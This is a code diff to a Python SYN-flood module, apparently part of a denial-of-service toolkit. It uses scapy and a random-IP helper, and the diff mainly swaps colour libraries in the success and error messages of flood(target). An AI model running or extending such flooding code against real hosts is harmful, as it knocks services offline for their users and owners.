@@ -1,13 +1,15 @@
 # Import modules
 import random
+from rich.console import Console
 from scapy.all import IP, TCP, send
 from bin.addons.utils import random_IP
-from stringcolor import *
 
-red = "#ff0033"
-green = "#02f93c"
-yellow = "#eefc32"
-blue = "\033[38;5;51m"
+# Define styled print
+print = Console().print
+red = "red3"
+green = "green1"
+yellow = "yellow1"
+blue = "dark_slate_gray2"
 
 
 def flood(target):
@@ -27,9 +29,12 @@ def flood(target):
             send(IP_Packet / TCP_Packet, verbose=False)
         except Exception as e:
             print(
-                f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('while sending SYN packet', yellow)}\n{e}"
+                f"[{red} bold][✘] ERROR[/{red} bold] "
+                + f"[{yellow}]while sending SYN packet[/{yellow}]\n{e}"
             )
         else:
             print(
-                f"{cs(f'[✔] SUCCESS', green)} {cs(f'SYN packet sent to', yellow)} {blue}{'{}:{}'.format(*target)}\033[0m"
+                f"[{green}][✔] SUCCESS[/{green}] "
+                + f"[{yellow}]SYN packet sent to[{yellow}] "
+                + f"[{blue}]{'{}:{}'.format(*target)}"
             )
